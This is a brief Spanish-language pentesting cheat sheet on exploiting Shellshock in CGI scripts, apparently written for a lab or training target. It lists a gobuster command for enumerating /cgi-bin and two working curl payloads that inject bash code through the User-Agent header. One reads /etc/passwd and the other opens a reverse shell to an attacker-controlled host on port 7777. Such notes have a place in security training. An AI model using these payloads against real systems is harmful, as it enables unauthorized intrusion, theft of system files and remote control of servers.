### INFO

- Conectan aplicaciones webs con otras aplicaciones corriendo en un server.
- Los programas que realizan estas conexiones se guardan en la carpeta /CGI-bin.

### ENUM

    gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi


### EXPLOITATION

##### Via user-agent:
Podemos envenenar el user-agent con curl o mediante el repeater de burp

##### Leer un archivo

    curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi


##### Generar una reverseshell

    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
